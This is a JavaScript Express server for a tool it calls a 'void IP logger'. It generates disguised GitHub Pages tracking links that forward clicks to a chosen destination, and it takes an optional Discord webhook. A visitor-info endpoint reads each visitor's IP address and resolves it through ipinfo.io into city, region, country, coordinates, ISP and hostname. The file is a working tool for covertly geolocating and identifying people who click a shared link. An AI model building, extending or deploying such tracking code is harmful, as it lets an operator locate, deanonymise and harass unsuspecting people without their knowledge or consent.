
// Express server for void IP logger
const express = require('express');
const cors = require('cors');
const { createTrackingRepo } = require('./create-repo');
const path = require('path');

// Initialize Express app
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../')));

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../index.html'));
});

// API endpoint to create a tracking link
app.post('/api/create-link', async (req, res) => {
    try {
        const { destinationUrl, customPath, discordWebhook } = req.body;
        
        // Validate input
        if (!destinationUrl) {
            return res.status(400).json({ error: 'Destination URL is required' });
        }
        
        // Generate a random path if not provided
        const path = customPath || generateRandomString(8);
        
        // Create GitHub repository
        const repoUrl = await createTrackingRepo(path, destinationUrl, discordWebhook);
        
        // Return the tracking link
        res.json({
            success: true,
            trackingLink: `https://${path}-void.github.io`,
            repoUrl: repoUrl
        });
    } catch (error) {
        console.error('Error creating tracking link:', error);
        res.status(500).json({ error: 'Failed to create tracking link', message: error.message });
    }
});

// API endpoint to get visitor information
app.get('/api/visitor-info', async (req, res) => {
    try {
        // Get visitor's IP address
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        
        // Get visitor information from ipinfo.io
        const response = await fetch(`https://ipinfo.io/${ip}/json`);
        const data = await response.json();
        
        // Return visitor information
        res.json({
            success: true,
            visitor: {
                ip: data.ip || 'unknown',
                location: {
                    city: data.city || 'unknown',
                    region: data.region || 'unknown',
                    country: data.country || 'unknown',
                    coordinates: data.loc || 'unknown'
                },
                network: {
                    isp: data.org || 'unknown',
                    hostname: data.hostname || 'unknown'
                }
            }
        });
    } catch (error) {
        console.error('Error getting visitor information:', error);
        res.status(500).json({ error: 'Failed to get visitor information', message: error.message });
    }
});

// Helper function to generate a random string
function generateRandomString(length) {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// Start server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
